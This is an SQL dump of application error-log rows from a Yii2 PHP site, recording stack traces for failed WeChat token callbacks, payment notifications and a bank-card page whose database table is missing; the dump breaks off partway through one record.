INSERT INTO `log` VALUES ('3', '1', 'yii\\base\\ErrorException:2', '1495013878.0873', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=142b3acb3de96787988bc8a9a06c45248e474da1&timestamp=1495013877&nonce=28320635&openid=oAkX8wFCQ-l6qUDIsp4kctiry5sQ][58.247.206.147][-][95nblb04k39qflbj2fapisca06]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('4', '1', 'yii\\base\\ErrorException:2', '1495014338.4662', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=f02e290242eb4e9bd77b7c9c27c39fdac5ab25cc&timestamp=1495014338&nonce=1773235371&openid=oAkX8wBdzb8qPlXLnizbInzqKb8k][58.247.206.152][-][2tmeotg4pnro4ifal0gr2kjh74]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('5', '1', 'yii\\base\\ErrorException:8', '1495014445.1763', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+17%3a47%3a23&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+17%3a47%3a23&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][2rt5psurrlsddb03gqido252o0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('6', '1', 'yii\\base\\ErrorException:8', '1495014461.9584', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+17%3a47%3a41&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+17%3a47%3a41&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][hpmt3c7pilurrqpjbrobrf5kr4]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('7', '1', 'yii\\base\\ErrorException:8', '1495014480.1424', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+17%3a47%3a59&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+17%3a47%3a59&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][j08o19j3tljnbeodm5911hv581]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('8', '1', 'yii\\base\\ErrorException:8', '1495014511.4873', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+17%3a48%3a31&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+17%3a48%3a31&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][sblcl0ua4uo5h4k74gajuinem3]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('9', '1', 'yii\\base\\ErrorException:8', '1495014695.0978', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+17%3a51%3a33&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+17%3a51%3a33&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][0rtmpudfr5jil94spdtmlpqja2]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('10', '1', 'yii\\db\\Exception', '1495015015.0157', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100005][r21ndl2d46e17j6cu85sbbcdj3]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100005\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('11', '1', 'yii\\db\\Exception', '1495015018.7292', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100005][r21ndl2d46e17j6cu85sbbcdj3]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100005\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('12', '1', 'yii\\db\\Exception', '1495015059.7947', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100005][pio3s5b0b6t6n5o7tqibep2ad5]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100005\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('13', '1', 'yii\\base\\ErrorException:8', '1495015060.9683', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('14', '1', 'yii\\base\\ErrorException:8', '1495015070.053', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('15', '1', 'yii\\db\\Exception', '1495015093.7174', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100005][pio3s5b0b6t6n5o7tqibep2ad5]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100005\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('16', '1', 'yii\\db\\Exception', '1495015096.75', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100005][pio3s5b0b6t6n5o7tqibep2ad5]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): 